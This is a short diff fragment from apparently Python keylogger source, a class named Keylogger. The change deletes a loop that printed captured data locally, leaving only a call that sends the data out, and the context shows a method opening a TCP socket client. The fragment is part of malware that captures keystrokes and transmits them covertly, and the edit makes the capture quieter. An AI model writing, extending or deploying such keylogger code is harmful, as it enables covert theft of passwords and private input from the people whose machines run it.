@@ -56,8 +56,7 @@ class Keylogger:
                             data.append(values)
         if data:
             self.send_data(data)
-            for i in data:
-                print(i)
+
     def start_socket(self):
         try:
             self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
